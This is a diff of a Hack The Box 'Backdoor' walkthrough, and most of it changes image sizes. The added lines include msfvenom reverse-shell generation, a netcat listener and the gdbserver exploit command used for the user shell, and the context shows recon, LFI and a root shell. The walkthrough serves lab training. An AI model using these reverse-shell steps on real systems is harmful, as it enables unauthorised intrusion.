@@ -20,22 +20,18 @@ respect me on hack the box  [`https://www.hackthebox.eu/profile/251876`](https:/
 
 # Recon 
 First use nmap for port scanning
-
 ## nmap 
 ```
 nmap -Pn -sV -sC -p- 10.10.11.125 -oN backdoor_nmap
 ```
 Nmap shows 3 open ports
-  -8080 open, running Tomcat
 
-
-
-<img src="/img/backdoor/1nmap.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/1nmap.PNG" alt="Getting-gz" width="1000" height="440">
 
 ## browser
 I installed  wappalyzer plugin to show what technology website used ,the target machine uses WordPress 5.8.1 CMS
 
-<img src="/img/backdoor/2brow.PNG.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/2brow.PNG" alt="Getting-gz" width="1000" height="440">
 
 ## wpscan
 ```
@@ -157,13 +153,15 @@ Interesting Finding(s):
 [+] Memory used: 225.582 MB
 [+] Elapsed time: 00:03:44
 ```
+
+After scanning here, there is not much useful information, but I know that the administrator user is admin
 ## searchsploit
 if you didn't find searchsploit ,install it
 ```
 sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
 sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
 ```
-<img src="/img/backdoor/install.PNG.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/install.PNG" alt="Getting-gz" width="1000" height="440">
 
 it was found that there are three vulnerabilities, but they are all plug-in vulnerabilities.
 
@@ -180,7 +178,7 @@ gobuster finds many of the paths I already found, but als
 gobuster dir -u http://backdoor.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ```
 
-<img src="/img/backdoor/gobuster.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/gobuster.PNG" alt="Getting-gz" width="1000" height="440">
 
 
 # Exploit
@@ -341,21 +339,28 @@ Use LFI to get info on port 1337 using proc. As the PID is unknown,
 
 Just read the /proc/{pid}/cmdline file like this, where pid is a variable number,the number range should be between 900-1000
 
+<img src="/img/backdoor/intruder.PNG" alt="Getting-gz" width="1000" height="440">
 
 
-
-<img src="/img/backdoor/intruder.PNG" alt="Getting-gz" width="800" height="440">
-
-
-<img src="/img/backdoor/intruder1.PNG.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/intruder1.PNG" alt="Getting-gz" width="1000" height="440">
 
 I found this cmdline for PID 954
 bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
 
 ## user flag
-search about  gdbserver
+search about  gdbserver exploit
 ```
 https://www.exploit-db.com/exploits/50539
+```
+```
+1. Generate shellcode with msfvenom:
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin
+
+2. Listen with Netcat:
+$ nc -nlvp 4444
+
+3. Run the exploit:
+$ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 ```
 
 ```
@@ -472,10 +477,12 @@ if __name__ == '__main__':
 ```
 python3 exploit.py   10.10.11.125:1337 rev.bin
 ```
-<img src="/img/backdoor/poc2.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/poc2.PNG" alt="Getting-gz" width="1000" height="440">
 
 
-<img src="/img/backdoor/pocuser.PNG" alt="Getting-gz" width="800" height="440">
+<img src="/img/backdoor/pocuser.PNG" alt="Getting-gz" width="1000" height="440">
+You'll get user :D
+
 
 # privesc
 ```
@@ -492,3 +499,7 @@ root@Backdoor:~# whoami
 whoami
 root
 ```
+You'll get root shell ;)
+
+I finished this machine today waiting me in the next part.
+
